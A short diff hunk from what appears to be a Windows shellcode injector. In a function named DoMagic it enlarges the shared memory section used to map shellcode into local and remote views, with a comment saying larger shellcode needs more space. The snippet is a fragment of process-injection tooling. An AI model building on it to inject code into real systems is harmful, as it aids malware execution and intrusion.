@@ -134,7 +134,9 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
 
     HANDLE hSection = NULL;
     NTSTATUS status = NULL;
-    SIZE_T size = 4096;
+        // Need to adjust size in case the shellcode is bigger!!
+    //SIZE_T size = 4096;
+    SIZE_T size = 80960;
     LARGE_INTEGER sectionSize = { size };
     PVOID pLocalView = NULL, pRemoteView = NULL;
     SIZE_T scLength = sizeof(shellcode);
